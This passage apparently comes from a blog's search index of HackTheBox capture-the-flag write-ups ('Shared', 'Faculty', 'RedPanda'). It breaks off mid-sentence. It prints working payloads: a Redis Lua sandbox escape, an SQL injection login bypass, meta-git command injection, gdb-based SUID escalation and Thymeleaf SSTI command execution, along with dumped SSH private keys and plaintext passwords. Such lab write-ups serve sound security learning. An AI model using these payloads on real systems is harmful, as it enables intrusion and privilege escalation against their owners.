KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO+/+OPh0/KiPg70GdaFWhgm8qEfFXLEXUbnSMkiB7JbC3fCfDCGUYmp9QiiQC0xiFeaSbvZFwA4NCZouzAW1W/ZXe60LaAXVAlEIbuGOVcNrVfh+XyXDFvEyre5BWNARQSarV5CGXk6ku---SNIP---YWfa9RiI5aTaWdOrytt2l3Djd1V1/c62M1ekUoUrIuc5PS8JNlZQl7fyfMSZC9mL+iOQAAAMEAy6SuHvYofbEAD3MS4VxQ+uo7G4sU3JjAkyscViaAdEeLejvnn9i24sLWv9oE9/UOgm2AwUg3cT7kmKUdAvBHsj20uwv8a1ezFQNN5vxTnQPQLTiZoUIR7FDTOkQ0W3hfvjznKXTMwictz9NZYWpEZQAuSX2QJgBJc1WNOtrgJscNauv7MOtZYclqKJShDd/NHUGPnNasHiPjtNCRr7thGmZ6G9yEnXKkjZJ1Neh5Gfx31fQBaBd4XyVFsvUSphjNAAAAwQD4Yntc2zAbNSt6GhNb4pHYwMTPwV4DoXDk+wIKmU7qs94cn4o33PAA7ClZ3ddVt9FTkqIrIkKQNXLQIVI7EYJg2H102ohz1lPWC9aLRFCDFz3bgBKluiS3N2SFbkGiQHZoT93qn612b+VOgX1qGjx1lZ/HI152QStTwcFPlJ0Wu6YIBcEq4Rc+iFqqQDq0z0MWhOHYvpcsycXk/hIlUhJNpExIs7TUKUSJyDK0JWt2oKPVhGA62iGGx2+cnGIoROcAAADBAMMvzNfUfamB1hdLrBS/9R+zEoOLUxbESENrA1qkplhN/wPta/wDX0v9hX9i+2ygYSicVp6CtXpd9KPsG0JvERiVNbwWxD3gXcm0BEwMtlVDb4WN1SG5Cpyx9ZhkdU+t0gZ225YYNiyWob3IaZYWVkNkeijRD+ijEY4rN41hiHlWHPDeHZn0yt8fTeFAm+Ny4+8+dLXMlZM5quPoa0zBbxzMZWpSI9E6j6rPWs2sJmBBEKVLQstfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg==-----END OPENSSH PRIVATE KEY-----Privilege escalationOur new user is a member of the developer group of course, but they are also member of the sysadmin group:uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)Looking for any files owned by this group we find the following:dan_smith@shared:~$ find / -group 1003 2&amp;gt;/dev/null/usr/local/bin/redis_connector_devWhen running the binary, the following is printed to the terminal:dan_smith@shared:/usr/local/bin$ ./redis_connector_dev [+] Logging to redis instance using password...INFO command result:# Serverredis_version:6.0.15redis_git_sha1:00000000redis_git_dirty:0redis_build_id:4610f4c3acf7fb25redis_mode:standaloneos:Linux 5.10.0-16-amd64 x86_64arch_bits:64multiplexing_api:epollatomicvar_api:atomic-builtingcc_version:10.2.1process_id:5636run_id:b8e4e1aa48304078a83690b0605822db59ba1ffetcp_port:6379uptime_in_seconds:28uptime_in_days:0hz:10configured_hz:10lru_clock:16327646executable:/usr/bin/redis-serverconfig_file:/etc/redis/redis.confio_threads_active:0 &amp;lt;nil&amp;gt;dan_smith@shared:/usr/local/bin$ It seems that it logs on to the local redis server. If we transfer the binary to our own system then set up a netcat listener on the standard redis port, 6379, we can figure out what password is used to authenticate to the server.┌──(bitis㉿workstation)-[~]└─$ nc -lvnp 6379 1 ⨯listening on [any] 6379 ...connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43228*2$4auth$16F2WHqJUz2WEz=GqqWith this password we can connect to the redis server on the target system. We also know that the redis version is 6.0.15 from the previous command. I found this vulnerability which seems promising.dan_smith@shared:~$ redis-cli127.0.0.1:6379&amp;gt; AUTH F2WHqJUz2WEz=GqqOK127.0.0.1:6379&amp;gt; eval &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0&quot;uid=0(root) gid=0(root) groups=0(root)\\n&quot;127.0.0.1:6379&amp;gt; eval &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;cat /root/root.txt&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0(error) NOAUTH Authentication required.127.0.0.1:6379&amp;gt; AUTH F2WHqJUz2WEz=GqqOK127.0.0.1:6379&amp;gt; eval &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;cat /root/root.txt&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0&quot;bdc555809c3e4021438169dcef11acb2\\n&quot;127.0.0.1:6379&amp;gt; Rooted!" }, { "title": "Faculty writeup", "url": "/posts/Faculty/", "categories": "Writeup, HackTheBox", "tags": "medium-box, gdb, getcap", "date": "2022-08-07 15:00:00 +0200", "snippet": "SummaryFootholdWe start out by doing an nmap port scan:┌──(bitis㉿workstation)-[~/Downloads]└─$ nmap -sC -sV 10.129.227.208Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-08 20:15 CESTNmap scan report for 10.129.227.208Host is up (0.023s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)| 256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)|_ 256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://faculty.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.80 secondsWe can tell that the web application uses the domain faculty.htb so we add the name to our /etc/hosts file.Entering the site and scanning it via ferox, we get the following results:┌──(bitis㉿workstation)-[~/Downloads]└─$ feroxbuster -u http://faculty.htb -B -r -x html txt php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓 ver: 2.7.0───────────────────────────┬────────────────────── 🎯 Target Url │ http://faculty.htb 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [html, txt, php] 🏦 Collect Backups │ true 🏁 HTTP methods │ [GET] 📍 Follow Redirects │ true 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────200 GET 132l 235w 0c http://faculty.htb/login.php200 GET 47l 106w 0c http://faculty.htb/header.php200 GET 175l 311w 0c http://faculty.htb/admin/login.php500 GET 0l 0w 0c http://faculty.htb/test.php200 GET 37l 84w 0c http://faculty.htb/topbar.php[####################] - 6m 882219/882219 0s found:5 errors:0 [####################] - 6m 882184/882184 2300/s http://faculty.htb If we enter the admin endpoint we are met with a login page.If we enter the username &#39; or 1=1-- - and something random as the password we can successfully login as admin of the page.We can also generate and download pdf files from the site via mpdf. A poc can be found here. If we URL encode the html twice and then base64 encode it, we can extract files from the server, such as /etc/passwd.root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsemysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/falsegbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bashpostfix:x:113:119::/var/spool/postfix:/usr/sbin/nologindeveloper:x:1001:1002:,,,:/home/developer:/bin/bashusbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinIf we try to curl the site we are told of the presence of a php file named admin_class.php┌──(bitis㉿workstation)-[~]└─$ curl &quot;http://faculty.htb/admin/ajax.php?action=login&quot; &amp;lt;br /&amp;gt;&amp;lt;b&amp;gt;Notice&amp;lt;/b&amp;gt;: Undefined variable: username in &amp;lt;b&amp;gt;/var/www/scheduling/admin/admin_class.php&amp;lt;/b&amp;gt; on line &amp;lt;b&amp;gt;21&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;b&amp;gt;Notice&amp;lt;/b&amp;gt;: Undefined variable: password in &amp;lt;b&amp;gt;/var/www/scheduling/admin/admin_class.php&amp;lt;/b&amp;gt; on line &amp;lt;b&amp;gt;21&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;We can then download this file via mpdf.&amp;lt;?phpsession_start();ini_set(&#39;display_errors&#39;, 1);Class Action { private $db; public function __construct() { ob_start(); include &#39;db_connect.php&#39;; $this-&amp;gt;db = $conn; } function __destruct() { $this-&amp;gt;db-&amp;gt;close(); ob_end_flush(); } function login(){ extract($_POST); $qry = $this-&amp;gt;db-&amp;gt;query(&quot;SELECT * FROM users where username = &#39;&quot;.$username.&quot;&#39; and password = &#39;&quot;.md5($password).&quot;&#39; &quot;); if($qry-&amp;gt;num_rows &amp;gt; 0){ foreach ($qry-&amp;gt;fetch_array() as $key =&amp;gt; $value) { if($key != &#39;password&#39; &amp;amp;&amp;amp; !is_numeric($key)) $_SESSION[&#39;login_&#39;.$key] = $value; } if($_SESSION[&#39;login_type&#39;] != 1){ foreach ($_SESSION as $key =&amp;gt; $value) { unset($_SESSION[$key]); } return 2 ; exit; } return 1; }else{ return 3; } }---SNIP---We can see that the php script includes db_connect.php. Downloading this file through the same mpdf trick.&amp;lt;?php $conn= new mysqli(&#39;localhost&#39;,&#39;sched&#39;,&#39;Co.met06aci.dly53ro.per&#39;,&#39;scheduling_db&#39;)or die(&quot;Could not connect to mysql&quot;.mysqli_error($con));We now have a list of users and a password. We can then try to login via ssh. We then discover that the credentials gbyolo:Co.met06aci.dly53ro.per work.Privilege escalationWe can run meta-git as the developer user:gbyolo@faculty:~$ sudo -l[sudo] password for gbyolo: Matching Defaults entries for gbyolo on faculty: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser gbyolo may run the following commands on faculty: (developer) /usr/local/bin/meta-gitWe can easily find a vulnerability in meta-git here. We can use this to read the ssh key of the developer user:gbyolo@faculty:/$ sudo -u developer meta-git clone &#39;poc | cat /home/developer/.ssh/id_rsa&#39;meta git cloning into &#39;poc | cat /home/developer/.ssh/id_rsa&#39; at id_rsaid_rsa:fatal: repository &#39;poc&#39; does not exist-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----As the developer user, we are part of the debug group. GDB also has some capabilities set.developer@faculty:~$ getcap /usr/bin/gdb/usr/bin/gdb = cap_sys_ptrace+epdeveloper@faculty:~$ groupsdeveloper debug facultydeveloper@faculty:~$ We can find all processes being run as root, and then set SUID on bash via gdb:developer@faculty:~$ ps faux | grep rootroot 619 0.0 0.9 26896 18256 ? Ss 20:12 0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers---SNIP---developer@faculty:~$ gdb -p 619(gdb) call (void)system(&quot;chmod u+s /bin/bash&quot;)[Detaching after vfork from child process 20979](gdb) quitA debugging session is active. Inferior 1 [process 619] will be detached.Quit anyway? (y or n) yDetaching from program: /usr/bin/python3.8, process 619[Inferior 1 (process 619) detached]developer@faculty:~$ bash -pbash-5.0# iduid=1001(developer) gid=1002(developer) euid=0(root) groups=1002(developer),1001(debug),1003(faculty)bash-5.0# Rooted!" }, { "title": "RedPanda writeup", "url": "/posts/Panda/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, ssti, xxe", "date": "2022-07-20 15:00:00 +0200", "snippet": "SummaryThis was actually a pretty tricky box. It starts out with thymeleaf template injection, and ends with a slightly complicated XXE attack to gain root access. Let’s take a look!FootholdWe start out by doing an nmap port scan:Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 16:42 CESTNmap scan report for 10.129.69.48Host is up (0.023s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)8080/tcp open http-proxy---SNIP---|_http-title: Red Panda Search | Made with Spring Boot|_http-open-proxy: Proxy might be redirecting requestsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.98 secondsThe host has two ports open, 22 and 8080, the second being a web application written in Spring Boot.There is a search functionality, and if we try to seach for ${env:PWD} we get told our query contains banned characters. On further analysis, it seems that it is the $ charachter that is banned.There is also an author page where you can export the authors pandas as an xml file.This does not really lead to anything as far as I”m aware however. If we go back to the search functionality, we can actually achieve SSTI. The $ character is banned, however * is not. Since the application is written using Spring Boot, I assume that the application uses thymeleaf. In thymeleaf, the expression ${...} is a variable expression while *{...} is a selection expression. While they have different functionality, both can be used to execute code.After messing about for a bit, we find that the injection*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream())}returns the output of the id command.We can also use this technique to read the user flag with the command *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&quot;cat /home/woodenk/user.txt&quot;).getInputStream())}I also found that the /opt directory contained the application directory for panda_search, however since the _ charachter is blacklisted I could not directly read it. Instead i used *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&quot;find /opt -name *&quot;).getInputStream())}, which uses find to list everything in the /opt directory, including subdirectories and files. I found that the applications controller was in the opt directory, nested in a lot of subdirectories, however to actually read the file I did some weird bash stuff again since I did not want to deal with smuggling in the _ character. Instead I injected *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&quot;grep -r -v fqwefwe /opt&quot;).getInputStream())}. This comands greps all files recursively in the /opt dir for strings not matching fqwefwe. This includes all lines in the controller, found below:package com.panda_search.htb.panda_search;import java.util.ArrayList;import java.io.IOException;import java.sql.*;import java.util.List;import java.util.ArrayList;import java.io.File;import java.io.InputStream;import java.io.FileInputStream;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;import org.springframework.web.bind.annotation.ResponseBody;import org.springframework.web.servlet.ModelAndView;import org.springframework.http.MediaType;import org.apache.commons.io.IOUtils;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;import org.jdom2.output.Format;import org.jdom2.output.XMLOutputter;import org.jdom2.*;@Controllerpublic class MainController { @GetMapping(&quot;/stats&quot;) public ModelAndView stats(@RequestParam(name=&quot;author&quot;,required=false) String author, Model model) throws JDOMException, IOException{ SAXBuilder saxBuilder = new SAXBuilder(); if(author == null) author = &quot;N/A&quot;; author = author.strip(); System.out.println(&quot;&quot;+ author &quot;&quot;); if(author.equals(&quot;woodenk&quot;) || author.equals(&quot;damian&quot;)) { String path = &quot;/credits/&quot; + author + &quot;_creds.xml&quot;; File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); String totalviews = rootElement.getChildText(&quot;totalviews&quot;); List&amp;amp;lt;Element&amp;amp;gt; images = rootElement.getChildren(&quot;image&quot;); for(Element image: images) System.out.println(image.getChildText(&quot;uri&quot;)); model.addAttribute(&quot;noAuthor&quot;, false); model.addAttribute(&quot;author&quot;, author); model.addAttribute(&quot;totalviews&quot;, totalviews); model.addAttribute(&quot;images&quot;, images); return new ModelAndView(&quot;stats.html&quot;); } else { model.addAttribute(&quot;noAuthor&quot;, true); return new ModelAndView(&quot;stats.html&quot;); } } @GetMapping(value=&quot;/export.xml&quot;, produces = MediaType.APPLICATION_OCTET_STREAM_VALUE) public @ResponseBody byte[] exportXML(@RequestParam(name=&quot;author&quot;, defaultValue=&quot;err&quot;) String author) throws IOException { System.out.println(&quot;Exporting xml of: &quot; + author); if(author.equals(&quot;woodenk&quot;) || author.equals(&quot;damian&quot;)) { InputStream in = new FileInputStream(&quot;/credits/&quot; + author + &quot;_creds.xml&quot;); System.out.println(in); return IOUtils.toByteArray(in); } else { return IOUtils.toByteArray(&quot;Error, incorrect paramenter &amp;amp;#39;author&amp;amp;#39;\\n\\r&quot;); } } @PostMapping(&quot;/search&quot;) public ModelAndView search(@RequestParam(&quot;name&quot;) String name, Model model) { if(name.isEmpty()) { name = &quot;Greg&quot;; } String query = filter(name); ArrayList pandas = searchPanda(query); System.out.println(&quot;\\n\\&quot;&quot;+query+&quot;\\&quot;\\n&quot;); model.addAttribute(&quot;query&quot;, query); model.addAttribute(&quot;pandas&quot;, pandas); model.addAttribute(&quot;n&quot;, pandas.size()); return new ModelAndView(&quot;search.html&quot;); } public String filter(String arg) { String[] no_no_words = {&quot;%&quot;, &quot;_&quot;,&quot;$&quot;, &quot;~&quot;, }; for (String word : no_no_words) { if(arg.contains(word)){ return &quot;Error occured: banned characters&quot;; } } return arg; } public ArrayList searchPanda(String query) { Connection conn = null; PreparedStatement stmt = null; ArrayList&amp;amp;lt;ArrayList&amp;amp;gt; pandas = new ArrayList(); try { Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, &quot;woodenk&quot;, &quot;RedPandazRule&quot;); stmt = conn.prepareStatement(&quot;SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?&quot;); stmt.setString(1, &quot;%&quot; + query + &quot;%&quot;); ResultSet rs = stmt.executeQuery(); while(rs.next()){ ArrayList&amp;amp;lt;String&amp;amp;gt; panda = new ArrayList&amp;amp;lt;String&amp;amp;gt;(); panda.add(rs.getString(&quot;name&quot;)); panda.add(rs.getString(&quot;bio&quot;)); panda.add(rs.getString(&quot;imgloc&quot;)); panda.add(rs.getString(&quot;author&quot;)); pandas.add(panda); } }catch(Exception e){ System.out.println(e);} return pandas; }}As can be seen, the controller makes a connection to a mysql database with the credentials: woodenk:RedPandazRule. We can use these to login as woodenk via SSH.Privilege escalationThe woodenk user cannot run sudo on the machine, so instead we start out by transferring pspy64 to the machine and running it. It seems that root is running a cleanup script ass our user:2022/07/20 16:25:01 CMD: UID=0 PID=2993 | sudo -u woodenk /opt/cleanup.sh 2022/07/20 16:25:01 CMD: UID=1000 PID=2994 | /bin/bash /opt/cleanup.sh 2022/07/20 16:25:01 CMD: UID=1000 PID=2995 | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; 2022/07/20 16:25:01 CMD: UID=1000 PID=2997 | /bin/bash /opt/cleanup.sh 2022/07/20 16:25:01 CMD: UID=1000 PID=2998 | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 2022/07/20 16:25:01 CMD: UID=1000 PID=3001 | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ; 2022/07/20 16:25:01 CMD: UID=1000 PID=3002 | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; 2022/07/20 16:25:01 CMD: UID=1000 PID=3004 | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; As we can see, the script removes xml and jpg files in various directories.Based on the controller, we can conclude that the application exports the requested xml file when the author argument is either woodenk or damian. Also, the application takes the xml file from the following location: ` InputStream in = new FileInputStream(“/credits/” + author + “_creds.xml”);`If we take a look at the logParser application also present on the system, it seems that all the images of the author get their metadata parsed:public class App { public static Map parseLog(String line) { String[] strings = line.split(&quot;\\\\|\\\\|&quot;); Map map = new HashMap&amp;lt;&amp;gt;(); map.put(&quot;status_code&quot;, Integer.parseInt(strings[0])); map.put(&quot;ip&quot;, strings[1]); map.put(&quot;user_agent&quot;, strings[2]); map.put(&quot;uri&quot;, strings[3]); return map; } public static boolean isImage(String filename){ if(filename.contains(&quot;.jpg&quot;)) { return true; } return false; } public static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = &quot;/opt/panda_search/src/main/resources/static&quot; + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for(Directory dir : metadata.getDirectories()) { for(Tag tag : dir.getTags()) { if(tag.getTagName() == &quot;Artist&quot;) { return tag.getDescription(); } } } return &quot;N/A&quot;; } public static void addViewTo(String path, String uri) throws JDOMException, IOException { SAXBuilder saxBuilder = new SAXBuilder(); XMLOutputter xmlOutput = new XMLOutputter(); xmlOutput.setFormat(Format.getPrettyFormat()); File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); for(Element el: rootElement.getChildren()) { if(el.getName() == &quot;image&quot;) { if(el.getChild(&quot;uri&quot;).getText().equals(uri)) { Integer totalviews = Integer.parseInt(rootElement.getChild(&quot;totalviews&quot;).getText()) + 1; System.out.println(&quot;Total views:&quot; + Integer.toString(totalviews)); rootElement.getChild(&quot;totalviews&quot;).setText(Integer.toString(totalviews)); Integer views = Integer.parseInt(el.getChild(&quot;views&quot;).getText()); el.getChild(&quot;views&quot;).setText(Integer.toString(views + 1)); } } } BufferedWriter writer = new BufferedWriter(new FileWriter(fd)); xmlOutput.output(doc, writer); } public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException { File log_fd = new File(&quot;/opt/panda_search/redpanda.log&quot;); Scanner log_reader = new Scanner(log_fd); while(log_reader.hasNextLine()) { String line = log_reader.nextLine(); if(!isImage(line)) { continue; } Map parsed_data = parseLog(line); System.out.println(parsed_data.get(&quot;uri&quot;)); String artist = getArtist(parsed_data.get(&quot;uri&quot;).toString()); System.out.println(&quot;Artist: &quot; + artist); String xmlPath = &quot;/credits/&quot; + artist + &quot;_creds.xml&quot;; addViewTo(xmlPath, parsed_data.get(&quot;uri&quot;).toString()); } }}Create an xml file that looks like the following. This is an xxe attack that loads the content of roots ssh key into our 